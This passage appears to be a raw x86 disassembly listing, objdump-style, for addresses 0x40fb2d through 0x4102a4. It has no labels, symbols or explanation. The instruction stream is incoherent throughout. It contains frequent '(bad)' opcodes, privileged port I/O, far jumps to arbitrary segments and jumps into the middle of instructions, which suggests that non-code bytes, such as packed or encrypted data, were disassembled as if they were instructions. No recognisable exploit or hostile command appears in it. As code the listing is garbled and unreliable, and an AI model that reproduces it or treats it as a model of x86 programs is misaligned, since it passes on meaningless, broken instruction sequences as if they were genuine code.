  40fb2d:	jmp    0x40fb3c
  40fb2f:	fist   WORD PTR [ecx+0x52b32d4b]
  40fb35:	xchg   bl,cl
  40fb37:	add    eax,0xddc6529
  40fb3c:	inc    edi
  40fb3d:	dec    edi
  40fb3e:	cmp    al,0xce
  40fb40:	jnp    0x40fba3
  40fb42:	add    eax,0x593aaa13
  40fb47:	push   esi
  40fb48:	jmp    0xfb7ad692
  40fb4d:	shl    ecx,0x3e
  40fb50:	xchg   edx,eax
  40fb51:	inc    esp
  40fb52:	leave  
  40fb53:	ret    
  40fb54:	cmc    
  40fb55:	push   ss
  40fb56:	and    al,0xa2
  40fb58:	xor    BYTE PTR [edi],dh
  40fb5a:	dec    edi
  40fb5b:	inc    ebp
  40fb5c:	test   esp,0x1dbe5461
  40fb62:	xchg   edi,eax
  40fb63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb64:	cld    
  40fb65:	dec    esp
  40fb66:	mov    edi,0x9023f711
  40fb6b:	lods   eax,DWORD PTR ds:[esi]
  40fb6c:	test   DWORD PTR [esi-0x47908486],edx
  40fb72:	pop    ebx
  40fb73:	aad    0x86
  40fb75:	push   eax
  40fb76:	sub    DWORD PTR [edi],esp
  40fb78:	jp     0x40fbb6
  40fb7a:	aas    
  40fb7b:	xor    ch,BYTE PTR [eax+0x398fce6c]
  40fb81:	add    BYTE PTR [edi+0x1a],bh
  40fb84:	sti    
  40fb85:	mov    cl,0x49
  40fb87:	xor    DWORD PTR [esi],0x5c2cbb12
  40fb8d:	enter  0xd756,0xe2
  40fb91:	nop
  40fb92:	pop    ebp
  40fb93:	lock cmp al,0x5b
  40fb96:	(bad)  
  40fb97:	fdivr  st(3),st
  40fb99:	pushf  
  40fb9a:	sbb    eax,ecx
  40fb9c:	and    DWORD PTR [esi-0x7042d9e6],esi
  40fba2:	sbb    al,0x94
  40fba4:	mov    eax,ds:0x9c18c9f8
  40fba9:	mov    BYTE PTR [esi],0xd5
  40fbac:	fcos   
  40fbae:	pop    ebp
  40fbaf:	sbb    al,0xa4
  40fbb1:	pop    eax
  40fbb2:	cdq    
  40fbb3:	out    dx,eax
  40fbb4:	mov    al,0xc0
  40fbb6:	lock outs dx,DWORD PTR ds:[esi]
  40fbb8:	lods   eax,DWORD PTR ds:[esi]
  40fbb9:	ret    
  40fbba:	jecxz  0x40fb3d
  40fbbc:	jbe    0x40fb9d
  40fbbe:	ret    
  40fbbf:	retf   
  40fbc0:	(bad)  
  40fbc1:	aam    0xd6
  40fbc3:	jecxz  0x40fc42
  40fbc5:	aam    0x72
  40fbc7:	mul    DWORD PTR [eax+0x5b3cfcb5]
  40fbcd:	(bad)  [esi+0x33]
  40fbd0:	sbb    eax,0x85f4d5b1
  40fbd5:	(bad)  
  40fbd7:	cmp    esi,esi
  40fbd9:	and    BYTE PTR [ebx+0x10],0xae
  40fbdd:	and    al,0xad
  40fbdf:	test   al,0x98
  40fbe1:	pop    eax
  40fbe2:	cdq    
  40fbe3:	lock out dx,al
  40fbe5:	ins    DWORD PTR es:[edi],dx
  40fbe6:	xor    esp,DWORD PTR [ebp-0x56bc3d33]
  40fbec:	push   esp
  40fbed:	inc    ebx
  40fbee:	in     eax,0x2
  40fbf0:	and    al,0xa3
  40fbf2:	mov    esi,edi
  40fbf4:	retf   0xa698
  40fbf7:	mov    esi,esp
  40fbf9:	popf   
  40fbfa:	mov    ds,WORD PTR ds:0x1b0d8ff7
  40fc00:	xor    eax,0x6110bd56
  40fc05:	cs out 0xef,eax
  40fc08:	packsswb mm5,QWORD PTR [ebx+0x5b138aa8]
  40fc0f:	test   BYTE PTR [eax-0x69b52447],0x1a
  40fc16:	ret    
  40fc17:	mov    dl,0xa3
  40fc19:	pop    DWORD PTR [eax+0x2ffe29a8]
  40fc1f:	mov    eax,ds:0xd9f0260
  40fc24:	cmp    BYTE PTR [edx],0x38
  40fc27:	adc    al,BYTE PTR [ecx]
  40fc29:	rcl    bl,0x86
  40fc2c:	sub    eax,0xdff81990
  40fc31:	je     0x40fc26
  40fc33:	add    ecx,ebp
  40fc35:	mov    ecx,0xbf1db65a
  40fc3a:	(bad)  
  40fc3b:	xchg   edx,eax
  40fc3c:	mov    ds:0xeafff80a,al
  40fc41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc42:	out    0xe0,eax
  40fc44:	jle    0x40fc55
  40fc46:	imul   esp,DWORD PTR [edi+0x24],0x44
  40fc4a:	in     al,dx
  40fc4b:	jbe    0x40fc4c
  40fc4d:	sub    eax,0x5dec9f01
  40fc52:	mov    edi,0x4214a27f
  40fc57:	lahf   
  40fc58:	push   ds
  40fc59:	add    BYTE PTR [eax-0x2c],ch
  40fc5c:	int    0x40
  40fc5e:	stos   DWORD PTR es:[edi],eax
  40fc5f:	mov    esi,DWORD PTR [eax+0x5]
  40fc62:	imul   edx,DWORD PTR [ebx-0x18],0xffffffdb
  40fc66:	mov    esi,cs
  40fc68:	in     eax,0x4a
  40fc6a:	cmp    eax,0x2191ecbc
  40fc6f:	or     ecx,ebp
  40fc71:	ror    BYTE PTR [esi-0x69ac220],cl
  40fc77:	out    dx,al
  40fc78:	sbb    bh,al
  40fc7a:	popf   
  40fc7b:	and    BYTE PTR [ebp+0x6d],ch
  40fc7e:	xlat   BYTE PTR ds:[ebx]
  40fc7f:	jmp    0x57f3aa5d
  40fc84:	cmp    DWORD PTR [ecx+edx*4-0x53],ebp
  40fc88:	hlt    
  40fc89:	je     0x40fc9e
  40fc8b:	in     al,0xa5
  40fc8d:	and    al,0x9c
  40fc8f:	jmp    0xd1a9:0x8b1f5a90
  40fc96:	test   cl,al
  40fc98:	push   ds
  40fc99:	push   ebx
  40fc9a:	sub    dh,BYTE PTR [edx]
  40fc9c:	ins    DWORD PTR es:[edi],dx
  40fc9d:	stos   DWORD PTR es:[edi],eax
  40fc9e:	cwde   
  40fc9f:	pop    esp
  40fca0:	hlt    
  40fca1:	mov    edx,0xf8fbd7e8
  40fca6:	xchg   BYTE PTR [edi],dh
  40fca8:	jle    0x40fcbc
  40fcaa:	ins    DWORD PTR es:[edi],dx
  40fcab:	cmp    ebp,DWORD PTR [edx+0x2739c31d]
  40fcb1:	hlt    
  40fcb2:	jns    0x40fce5
  40fcb4:	repz (bad) 
  40fcb6:	fidiv  DWORD PTR [esi]
  40fcb8:	test   al,0xa3
  40fcba:	pop    ss
  40fcbb:	ds push edx
  40fcbd:	cmp    ah,bh
  40fcbf:	jge    0x40fc5f
  40fcc1:	jae    0x40fd0f
  40fcc3:	loope  0x40fce4
  40fcc5:	sbb    edx,0xd25f534c
  40fccb:	pop    es
  40fccc:	and    ebx,DWORD PTR [edx]
  40fcce:	gs cli 
  40fcd0:	aam    0xc8
  40fcd2:	adc    bh,bl
  40fcd4:	push   edx
  40fcd5:	cdq    
  40fcd6:	jmp    0xd016bb17
  40fcdb:	iret   
  40fcdc:	xor    al,0x13
  40fcde:	add    eax,0xf35485a0
  40fce3:	iret   
  40fce4:	push   0xffffffa3
  40fce6:	dec    edx
  40fce7:	jl     0x40fcc2
  40fce9:	or     eax,0x4efbb5fe
  40fcee:	mov    fs,WORD PTR [esi+0x17]
  40fcf1:	and    ecx,DWORD PTR [edi]
  40fcf3:	adc    eax,0x1bb7a81f
  40fcf8:	shr    DWORD PTR [ebx],0xf3
  40fcfb:	mov    ds:0x360d3458,eax
  40fd00:	pop    ds
  40fd01:	or     edx,DWORD PTR [edi+0x1976ddd9]
  40fd07:	push   ss
  40fd08:	icebp  
  40fd09:	stos   DWORD PTR es:[edi],eax
  40fd0a:	dec    ebp
  40fd0b:	ror    cl,cl
  40fd0d:	push   ss
  40fd0e:	push   esp
  40fd0f:	popa   
  40fd10:	inc    esp
  40fd11:	outs   dx,BYTE PTR ds:[esi]
  40fd12:	int3   
  40fd13:	add    dl,0xed
  40fd16:	jo     0x40fcce
  40fd18:	call   0xe2694371
  40fd1d:	and    DWORD PTR [edi+0x47],eax
  40fd20:	or     DWORD PTR [ecx],ebp
  40fd22:	mov    al,ds:0x5f3cd93b
  40fd27:	es je  0x40fd5b
  40fd2a:	leave  
  40fd2b:	mov    al,0x63
  40fd2d:	ss lahf 
  40fd2f:	add    esi,DWORD PTR [ebp-0x430b7888]
  40fd35:	jmp    0xf20e08ab
  40fd3a:	test   DWORD PTR [esi+ebx*1+0x6a77990f],eax
  40fd41:	rol    ebp,cl
  40fd43:	fmul   st,st(3)
  40fd45:	mov    cl,0xec
  40fd47:	and    eax,0x9f033c06
  40fd4c:	es mov edi,0x7cb0eb79
  40fd52:	add    BYTE PTR [edx+0x400411c7],0xa7
  40fd59:	mov    edi,0xb76c8a1a
  40fd5e:	fcmovu st,st(3)
  40fd60:	cmp    al,0xbd
  40fd62:	shr    DWORD PTR [ebp-0x52086488],cl
  40fd68:	dec    esi
  40fd69:	iret   
  40fd6a:	mov    ecx,0x3168493e
  40fd6f:	jle    0x40fda5
  40fd71:	or     DWORD PTR [ebx],0x7e455f36
  40fd77:	cmp    BYTE PTR [edx],bl
  40fd79:	xor    al,0x76
  40fd7b:	ins    DWORD PTR es:[edi],dx
  40fd7c:	jnp    0x40fd92
  40fd7e:	test   esi,0xb3f5352d
  40fd84:	ret    
  40fd85:	nop
  40fd86:	cmp    al,0x22
  40fd88:	dec    ebx
  40fd89:	pop    eax
  40fd8a:	sbb    eax,0x16d1d789
  40fd8f:	jl     0x40fdaf
  40fd91:	push   0x10
  40fd93:	pop    ss
  40fd94:	push   ss
  40fd95:	cmp    DWORD PTR [ebx],eax
  40fd97:	es test ah,bl
  40fd9a:	test   esi,edi
  40fd9c:	xchg   esi,eax
  40fd9d:	jo     0x40fdaf
  40fd9f:	ret    0x30a0
  40fda2:	xor    BYTE PTR [esi+0x23],0xa3
  40fda6:	daa    
  40fda7:	cld    
  40fda8:	shr    DWORD PTR [ecx+0x3f5aa870],0x12
  40fdaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fdb0:	push   ds
  40fdb1:	fs imul ebx,esp,0xffffffc3
  40fdb5:	mov    eax,ebp
  40fdb7:	shr    BYTE PTR [edx+ecx*8-0x602a12dc],cl
  40fdbe:	xor    al,ch
  40fdc0:	stos   BYTE PTR es:[edi],al
  40fdc1:	or     ch,BYTE PTR [ebx-0x5b]
  40fdc4:	jmp    0x2997:0x612778fc
  40fdcb:	outs   dx,DWORD PTR ds:[esi]
  40fdcc:	inc    BYTE PTR [eax-0x4f]
  40fdcf:	and    DWORD PTR [edx+0x2c],edx
  40fdd2:	(bad)  
  40fdd3:	cmc    
  40fdd4:	repz js 0x40fd6e
  40fdd7:	dec    ecx
  40fdd8:	les    esp,FWORD PTR [ebx+ecx*2]
  40fddb:	retf   
  40fddc:	xchg   ebp,eax
  40fddd:	sub    ebx,esi
  40fddf:	cld    
  40fde0:	mov    ch,0x8
  40fde2:	aad    0x6f
  40fde4:	lods   eax,DWORD PTR ds:[esi]
  40fde5:	repnz inc ebx
  40fde7:	jecxz  0x40fe5d
  40fde9:	or     BYTE PTR [eax],dh
  40fdeb:	xchg   edx,eax
  40fdec:	jmp    0xebdb835b
  40fdf1:	fwait
  40fdf2:	repz jnp 0x40fe12
  40fdf5:	jle    0x40fe39
  40fdf7:	fnop   
  40fdf9:	adc    al,0x3c
  40fdfb:	mov    ebp,DWORD PTR ds:0xceee43d6
  40fe01:	pop    ebx
  40fe02:	pop    ss
  40fe03:	adc    DWORD PTR [esi-0x1f3544fc],ebp
  40fe09:	pop    ds
  40fe0a:	add    eax,0xb3b6234b
  40fe0f:	sbb    edi,esp
  40fe11:	inc    ebx
  40fe12:	push   esp
  40fe13:	je     0x40fe4a
  40fe15:	leave  
  40fe16:	int3   
  40fe17:	mov    esp,0x4aa93aeb
  40fe1c:	mov    edi,DWORD PTR [eax-0x4b]
  40fe1f:	ror    BYTE PTR [ebp+0x3c276e1b],cl
  40fe25:	cld    
  40fe26:	sbb    eax,0xe5e2569a
  40fe2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe2c:	and    esp,DWORD PTR [eax]
  40fe2e:	jg     0x40fdc8
  40fe30:	lock lods al,BYTE PTR ds:[esi]
  40fe32:	fistp  WORD PTR [edx+0x44]
  40fe35:	mov    edx,0x3194c3b
  40fe3a:	test   eax,0x1eb6a5c3
  40fe3f:	daa    
  40fe40:	fild   WORD PTR [edx+0x4a7afae9]
  40fe46:	fcomp  QWORD PTR [ebx]
  40fe48:	push   es
  40fe49:	add    al,0x96
  40fe4b:	fild   WORD PTR [eax+0x6bde4880]
  40fe51:	jae    0x40fe56
  40fe53:	sbb    al,0x59
  40fe55:	mov    ebx,DWORD PTR cs:[ebx+0x6c]
  40fe59:	push   esi
  40fe5a:	clc    
  40fe5b:	mov    dl,0xb2
  40fe5d:	lahf   
  40fe5e:	fld    QWORD PTR [eax-0x2606536a]
  40fe64:	or     al,0x20
  40fe66:	cmp    al,0x92
  40fe68:	inc    edx
  40fe69:	ret    0x426b
  40fe6c:	ror    edx,cl
  40fe6e:	pop    ss
  40fe6f:	jae    0x40fe97
  40fe71:	clc    
  40fe72:	call   0x181ce957
  40fe77:	mov    cl,cl
  40fe79:	cmp    DWORD PTR [edi-0x3b],0xe
  40fe7d:	dec    esp
  40fe7e:	xor    DWORD PTR [esi+ecx*8],0x2
  40fe82:	(bad)  
  40fe83:	cli    
  40fe84:	scas   al,BYTE PTR es:[edi]
  40fe85:	mov    al,0xdc
  40fe87:	cmp    BYTE PTR [edi],ch
  40fe89:	stos   DWORD PTR es:[edi],eax
  40fe8a:	sbb    DWORD PTR [ebp-0x77],esp
  40fe8d:	jbe    0x40fe58
  40fe8f:	mov    DWORD PTR [ebx-0x52],ebp
  40fe92:	enter  0xd4a4,0x22
  40fe96:	inc    esi
  40fe97:	inc    eax
  40fe98:	mov    dh,0x5c
  40fe9a:	in     al,dx
  40fe9b:	cmp    edi,ecx
  40fe9d:	sbb    bl,BYTE PTR [eax-0x1d]
  40fea0:	push   ds
  40fea1:	(bad)  
  40fea2:	shr    ebx,1
  40fea4:	inc    ebp
  40fea5:	pop    esp
  40fea6:	leave  
  40fea7:	mov    ds:0x281fc70c,al
  40feac:	sbb    dh,cl
  40feae:	cmp    al,0xe7
  40feb0:	jno    0x40fe8d
  40feb2:	in     eax,0x63
  40feb4:	adc    eax,0x46e799de
  40feb9:	div    ah
  40febb:	cmp    ah,BYTE PTR [edi]
  40febd:	in     eax,0x77
  40febf:	sub    bl,cl
  40fec1:	retf   
  40fec2:	dec    edi
  40fec3:	test   BYTE PTR [edi-0x8],ah
  40fec6:	in     eax,dx
  40fec7:	mov    eax,0x8a3c2199
  40fecc:	jmp    0x29e857fd
  40fed1:	sbb    dl,BYTE PTR [edi+ecx*8-0x5d57c1c0]
  40fed8:	sub    bl,BYTE PTR [edi-0x33]
  40fedb:	and    DWORD PTR [edx+ecx*8-0x1b],ecx
  40fedf:	out    dx,eax
  40fee0:	add    edx,esp
  40fee2:	cli    
  40fee3:	xchg   edi,eax
  40fee4:	jl     0x40fec8
  40fee6:	outs   dx,DWORD PTR ds:[esi]
  40fee7:	jl     0x40ff65
  40fee9:	test   bh,ch
  40feeb:	inc    ecx
  40feec:	cwde   
  40feed:	aad    0x72
  40feef:	fwait
  40fef0:	aaa    
  40fef1:	jl     0x40fea0
  40fef3:	sub    eax,0xc817aed
  40fef8:	sub    al,0x13
  40fefb:	mov    dh,0xae
  40fefd:	mov    eax,0x2beeb9d4
  40ff02:	cdq    
  40ff03:	mov    cl,0xc9
  40ff05:	jmp    0x21b4:0x4d7b57a7
  40ff0c:	adc    DWORD PTR [eax],ebx
  40ff0e:	mov    bh,0x9
  40ff10:	push   esi
  40ff11:	int3   
  40ff12:	inc    edx
  40ff13:	sub    bh,ah
  40ff15:	lods   eax,DWORD PTR ds:[esi]
  40ff16:	test   eax,0xb8ed70e1
  40ff1b:	fldenv [edi-0x4192f159]
  40ff21:	adc    ecx,DWORD PTR [eax+eax*2]
  40ff24:	nop
  40ff25:	imul   eax,DWORD PTR [eax],0x5
  40ff28:	sub    BYTE PTR [edi+0x4b89cfc],cl
  40ff2e:	jmp    FWORD PTR [eax-0x3ddfb5f8]
  40ff34:	push   0xc6d6ccd1
  40ff39:	pop    esi
  40ff3a:	push   esp
  40ff3b:	jno    0x40ff28
  40ff3d:	sbb    BYTE PTR [edx],cl
  40ff3f:	rcr    DWORD PTR [ebx-0x2e],1
  40ff42:	add    BYTE PTR [ebx+0x66],cl
  40ff45:	rol    DWORD PTR [ebx],1
  40ff47:	in     al,dx
  40ff48:	fldenv [ebx-0x5fa12d4]
  40ff4e:	dec    esp
  40ff4f:	sahf   
  40ff50:	mov    ecx,0xf65a8a08
  40ff55:	inc    edi
  40ff56:	popa   
  40ff57:	mov    al,ds:0x91153d00
  40ff5c:	in     al,dx
  40ff5d:	add    BYTE PTR [ecx+0x72c7e965],ch
  40ff63:	adc    eax,0x9020bf9d
  40ff68:	stos   BYTE PTR es:[edi],al
  40ff69:	mov    esi,0x7cc0de6d
  40ff6e:	mov    DWORD PTR [eax-0x6b19cc95],esp
  40ff74:	popa   
  40ff75:	mov    al,0x40
  40ff77:	jp     0x40fef9
  40ff79:	outs   dx,BYTE PTR ds:[esi]
  40ff7a:	mov    DWORD PTR [ecx],ebp
  40ff7c:	push   edi
  40ff7d:	cld    
  40ff7e:	jg     0x40ff95
  40ff80:	lea    edx,[esp+0x20]
  40ff84:	inc    ebp
  40ff85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff86:	je     0x40ff4f
  40ff88:	stos   DWORD PTR es:[edi],eax
  40ff89:	retf   
  40ff8a:	mov    eax,ds:0xbdfd81a0
  40ff8f:	ds ret 
  40ff91:	scas   eax,DWORD PTR es:[edi]
  40ff92:	cmc    
  40ff93:	sti    
  40ff94:	pop    eax
  40ff95:	enter  0x5440,0xb8
  40ff99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff9a:	ins    DWORD PTR es:[edi],dx
  40ff9b:	push   esp
  40ff9c:	sahf   
  40ff9d:	cmp    al,0x1a
  40ff9f:	jo     0x40ff9d
  40ffa1:	push   ecx
  40ffa2:	(bad)
  40ffa6:	loope  0x40ff92
  40ffa8:	adc    eax,DWORD PTR [esi-0x2a0cdf8]
  40ffae:	test   eax,0xc2188e89
  40ffb3:	mov    edx,0xc0dbe4fb
  40ffb8:	ja     0x40ffc2
  40ffba:	adc    DWORD PTR [edx-0x588e1b46],edx
  40ffc0:	jmp    0xcd6b:0x591cf9fb
  40ffc7:	ret    0x3ad3
  40ffca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ffcb:	mul    DWORD PTR [eax+ebx*4-0x2d]
  40ffcf:	popf   
  40ffd0:	mov    ebp,0x492e4185
  40ffd5:	aaa    
  40ffd6:	call   0x6f466158
  40ffdb:	pushf  
  40ffdc:	imul   ecx
  40ffde:	shl    edx,1
  40ffe0:	xchg   ebx,eax
  40ffe1:	outs   dx,BYTE PTR ds:[esi]
  40ffe2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffe3:	xor    BYTE PTR [esi-0x2df027d7],bh
  40ffe9:	or     esi,DWORD PTR [ecx-0x2b]
  40ffec:	mov    ebp,ecx
  40ffee:	dec    esp
  40ffef:	pop    ss
  40fff0:	or     ah,BYTE PTR [edx]
  40fff2:	cld    
  40fff3:	ins    BYTE PTR es:[edi],dx
  40fff4:	cmc    
  40fff5:	int3   
  40fff6:	xor    BYTE PTR ds:0xf341c4a8,0xf1
  40fffd:	and    bl,BYTE PTR [esp+ebp*8-0x44d6761e]
  410004:	lds    edx,FWORD PTR [ebp-0x30]
  410007:	xchg   DWORD PTR [ebp-0xd8cc752],edi
  41000d:	std    
  41000e:	xor    BYTE PTR [edx+0x19],bl
  410011:	fadd   QWORD PTR [esi]
  410013:	mov    ds:0xe2c73808,al
  410018:	jge    0x410084
  41001a:	mov    ah,0x66
  41001c:	repz not DWORD PTR [ecx-0x62dcb3fe]
  410023:	dec    ecx
  410024:	sbb    al,0xb
  410026:	outs   dx,DWORD PTR ds:[esi]
  410027:	sbb    dl,BYTE PTR [edx-0x5c20df4f]
  41002d:	retf   
  41002e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41002f:	outs   dx,BYTE PTR ds:[esi]
  410030:	je     0x410067
  410032:	test   al,0x71
  410034:	and    DWORD PTR ds:[ebx],0xcc6317ca
  41003b:	sbb    bh,al
  41003d:	sbb    al,0xc5
  41003f:	or     ebx,esp
  410041:	sti    
  410042:	outs   dx,BYTE PTR ds:[esi]
  410043:	pop    edx
  410044:	xchg   ebx,eax
  410045:	sbb    DWORD PTR [esi+0x54],esi
  410048:	sub    ah,BYTE PTR [eax-0x7e9e4545]
  41004e:	xor    ebp,DWORD PTR [ebp+0x4ddfb5ad]
  410054:	gs int3 
  410056:	mov    DWORD PTR [ecx+0x62],edx
  410059:	stc    
  41005a:	popa   
  41005b:	icebp  
  41005c:	xor    BYTE PTR [ecx-0x354e8388],ah
  410062:	ins    DWORD PTR es:[edi],dx
  410063:	push   ds
  410064:	mov    edx,0x4e5404f5
  410069:	mov    bl,0x17
  41006b:	mov    ecx,es
  41006d:	adc    ebp,edx
  41006f:	pop    ecx
  410070:	imul   edx,DWORD PTR [edi-0x6d555a70],0xffffff8c
  410077:	mov    ah,0x79
  410079:	nop
  41007a:	popa   
  41007b:	inc    ebx
  41007c:	fild   DWORD PTR [ecx+0x5]
  41007f:	mov    al,0x9b
  410081:	mov    edx,0x47f82895
  410086:	cmp    DWORD PTR [ecx],edi
  410088:	or     al,0xf5
  41008a:	push   ds
  41008b:	xor    ebx,DWORD PTR [esp+eax*2]
  41008e:	scas   eax,DWORD PTR es:[edi]
  41008f:	sub    bh,BYTE PTR [ebp-0x652ae304]
  410095:	sbb    BYTE PTR [esi+0x77],cl
  410098:	dec    ebx
  410099:	dec    edx
  41009a:	jg     0x41009b
  41009c:	add    BYTE PTR [ebx],bl
  41009e:	inc    esp
  41009f:	mov    WORD PTR [eax-0x2c],fs
  4100a2:	mov    eax,0x3208c024
  4100a7:	mov    DWORD PTR [edx],ebp
  4100a9:	push   es
  4100aa:	xor    al,0x12
  4100ac:	push   edx
  4100ad:	stos   BYTE PTR es:[edi],al
  4100ae:	sbb    edi,DWORD PTR [ecx-0x57ec3d45]
  4100b4:	inc    eax
  4100b5:	push   ebx
  4100b6:	jb     0x410083
  4100b8:	jg     0x4100d5
  4100ba:	aam    0xa2
  4100bc:	lock push ss
  4100be:	aam    0x25
  4100c0:	xchg   ebp,eax
  4100c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4100c2:	gs stos BYTE PTR es:[edi],al
  4100c4:	mov    bh,0xa2
  4100c6:	xor    DWORD PTR [edx+0xb88003b],0x39
  4100cd:	jmp    DWORD PTR [esi+0x3ce7c858]
  4100d3:	aaa    
  4100d4:	(bad)
  4100d8:	jnp    0x410122
  4100da:	sar    DWORD PTR ds:0x550d34c,0xc2
  4100e2:	xor    al,0x98
  4100e4:	add    eax,DWORD PTR [eax+0x45]
  4100e7:	jb     0x41015f
  4100e9:	out    0x8e,al
  4100eb:	xchg   edi,eax
  4100ec:	cmp    cl,BYTE PTR [esi]
  4100ee:	or     BYTE PTR [eax],cl
  4100f0:	inc    ecx
  4100f1:	loopne 0x41015d
  4100f3:	or     BYTE PTR [edx+0x5cc0795c],0xcf
  4100fa:	lahf   
  4100fb:	add    esi,esp
  4100fd:	sub    bl,0x38
  410100:	ja     0x4100ae
  410102:	xor    BYTE PTR [ecx+ebx*2+0x29829ebc],cl
  410109:	sbb    al,0x18
  41010b:	rol    DWORD PTR [ecx+0x49],0x1c
  41010f:	lods   al,BYTE PTR ds:[esi]
  410110:	push   ebp
  410111:	or     BYTE PTR [eax+0x774bc5d3],ch
  410117:	rcr    BYTE PTR ds:0x51ef01ef,1
  41011d:	fcomip st,st(5)
  41011f:	out    0xfa,al
  410121:	add    BYTE PTR [esi],bh
  410123:	mov    dl,0x22
  410125:	or     cl,BYTE PTR [edi+eax*8-0x6c000dcb]
  41012c:	jns    0x4100b4
  41012e:	mov    dh,0x3
  410130:	dec    edx
  410131:	aam    0x35
  410133:	imul   edi,DWORD PTR [ecx-0x4ae6e6dc],0x33eaf472
  41013d:	sub    al,0x43
  41013f:	or     bh,0xeb
  410142:	xor    DWORD PTR [eax],eax
  410144:	mov    edx,0xf81e09f8
  410149:	sbb    al,0xb0
  41014b:	sub    BYTE PTR [edx+0x144d6d],bl
  410151:	in     al,dx
  410152:	cmp    BYTE PTR ds:0x76a994eb,ah
  410158:	push   eax
  410159:	arpl   bx,bx
  41015b:	push   ds
  41015c:	mov    dh,0xef
  41015e:	push   0xffffffad
  410160:	xchg   esp,eax
  410161:	add    eax,0xd37c6a22
  410166:	inc    eax
  410167:	add    eax,DWORD PTR [eax+0xaeae715]
  41016d:	cmp    DWORD PTR [ebx],0xabb4b65c
  410173:	(bad)  
  410174:	jl     0x410147
  410176:	adc    eax,0x7a15c30b
  41017b:	jmp    eax
  41017d:	sbb    eax,0xee09e491
  410182:	ins    BYTE PTR es:[edi],dx
  410183:	call   0x280b:0xa478a8a4
  41018a:	pop    ecx
  41018b:	inc    ecx
  41018c:	fist   WORD PTR [edx-0x793120a6]
  410192:	xor    eax,0x69273ab4
  410197:	jae    0x41015c
  410199:	scas   al,BYTE PTR es:[edi]
  41019a:	add    ch,BYTE PTR [ebp-0x36]
  41019d:	pop    edx
  41019e:	dec    esp
  41019f:	out    0x8e,al
  4101a1:	cmp    DWORD PTR ss:[ecx+ebp*8],edi
  4101a5:	fs push ecx
  4101a7:	test   al,0xfe
  4101a9:	push   eax
  4101aa:	rcr    BYTE PTR [edi-0x45],cl
  4101ad:	xchg   ebx,eax
  4101ae:	adc    al,al
  4101b0:	loop   0x41014c
  4101b2:	add    ebx,ebp
  4101b4:	sti    
  4101b5:	cmp    al,0x61
  4101b7:	pop    ds
  4101b8:	xchg   edx,eax
  4101b9:	popa   
  4101ba:	into   
  4101bb:	cmp    DWORD PTR [edx-0x19],edx
  4101be:	push   ebp
  4101bf:	push   edi
  4101c0:	pop    ds
  4101c1:	fcomp  DWORD PTR [ebx]
  4101c3:	pop    ebp
  4101c4:	mov    esp,0x6839b4b2
  4101ca:	dec    edi
  4101cb:	stos   BYTE PTR es:[edi],al
  4101cc:	sub    esi,DWORD PTR [esi+ecx*8-0x5918a991]
  4101d3:	shl    DWORD PTR [eax+0x76],cl
  4101d6:	sub    DWORD PTR [ebp+0x4e],esi
  4101d9:	cmp    ah,BYTE PTR [esi]
  4101db:	and    edx,DWORD PTR [edx]
  4101dd:	inc    ebp
  4101de:	sub    esp,DWORD PTR [ebx]
  4101e0:	mov    dl,0x3a
  4101e2:	out    0xdf,eax
  4101e4:	jl     0x41020c
  4101e6:	sub    edx,DWORD PTR [esp+ebp*1+0x25]
  4101ea:	mov    al,0x3
  4101ec:	push   DWORD PTR [ebp-0x56]
  4101ef:	out    dx,eax
  4101f0:	jle    0x4101cc
  4101f2:	mov    edx,0xced58b09
  4101f7:	xchg   edx,eax
  4101f8:	enter  0x4924,0x35
  4101fc:	lds    ebx,FWORD PTR [eax]
  4101fe:	add    dh,cl
  410200:	pop    ebx
  410201:	xchg   esi,eax
  410202:	mov    cl,0x82
  410204:	hlt    
  410205:	sbb    DWORD PTR [ebx-0x46],ebx
  410208:	int3   
  410209:	outs   dx,BYTE PTR ds:[esi]
  41020a:	fsubr  DWORD PTR [ecx-0x4d312736]
  410210:	jge    0x41024a
  410212:	test   al,0x4d
  410214:	in     eax,0x8a
  410216:	cmp    ch,bh
  410218:	cmp    bl,dh
  41021a:	or     ebx,ecx
  41021c:	aas    
  41021d:	mov    bl,0x20
  41021f:	ret    
  410220:	pop    esi
  410221:	xor    ah,cl
  410223:	dec    eax
  410224:	or     DWORD PTR [ebp-0xe],edx
  410227:	pushf  
  410228:	repz int3 
  41022a:	aaa    
  41022b:	ds aaa 
  41022d:	rcl    BYTE PTR [eax-0x13],1
  410230:	jmp    0xd6a94622
  410235:	push   0xffffffcf
  410237:	bound  esp,QWORD PTR [ecx+0x5c]
  41023a:	pop    es
  41023b:	and    BYTE PTR [edx-0xed3607b],ch
  410241:	cli    
  410242:	sbb    eax,0x7594f279
  410247:	sbb    eax,0x2894a70e
  41024c:	jmp    0x471d7ce2
  410251:	dec    edx
  410252:	stos   DWORD PTR es:[edi],eax
  410253:	cld    
  410254:	adc    BYTE PTR [ebx-0x34],ah
  410257:	xor    cl,BYTE PTR [esi-0xf6e619f]
  41025d:	lods   eax,DWORD PTR ds:[esi]
  41025e:	cs into 
  410260:	xchg   ecx,eax
  410261:	xchg   ebp,eax
  410262:	adc    eax,0x762b815b
  410267:	adc    al,0x34
  410269:	call   0xec9bca76
  41026e:	xor    BYTE PTR [ebx],dl
  410270:	rcr    esi,cl
  410272:	retf   0x252
  410275:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410276:	arpl   WORD PTR [edi],bx
  410278:	xchg   edi,eax
  410279:	cmp    dh,cl
  41027b:	int3   
  41027c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41027d:	aam    0xeb
  41027f:	add    dh,bh
  410281:	add    BYTE PTR [ebp-0x76],ch
  410284:	xor    edx,DWORD PTR [eax+0x7d85462d]
  41028a:	and    eax,0x58457ce6
  41028f:	sbb    eax,0x651123bb
  410294:	jle    0x41024c
  410296:	pop    es
  410297:	ret    0x88fe
  41029a:	mov    eax,ecx
  41029c:	and    BYTE PTR [ecx],bl
  41029e:	xchg   DWORD PTR [edx-0x3af3742f],ebx
  4102a4:	es inc ebp
